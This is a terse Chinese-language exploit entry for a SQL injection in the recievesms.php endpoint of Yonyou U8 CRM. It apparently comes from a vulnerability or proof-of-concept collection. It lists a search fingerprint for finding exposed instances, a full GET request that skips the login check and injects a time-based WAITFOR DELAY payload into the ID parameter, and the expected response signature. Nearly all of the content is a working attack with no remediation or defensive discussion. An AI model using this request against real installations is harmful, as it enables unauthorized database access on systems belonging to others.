# 用友U8CRMrecievesms.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="用友U8CRM"`
- **请求**：`GET /bgt/recievesms.php?DontCheckLogin=1&ID=1;WAITFOR DELAY '0:0:1'-- HTTP/1.1`
- **响应特征**：200 6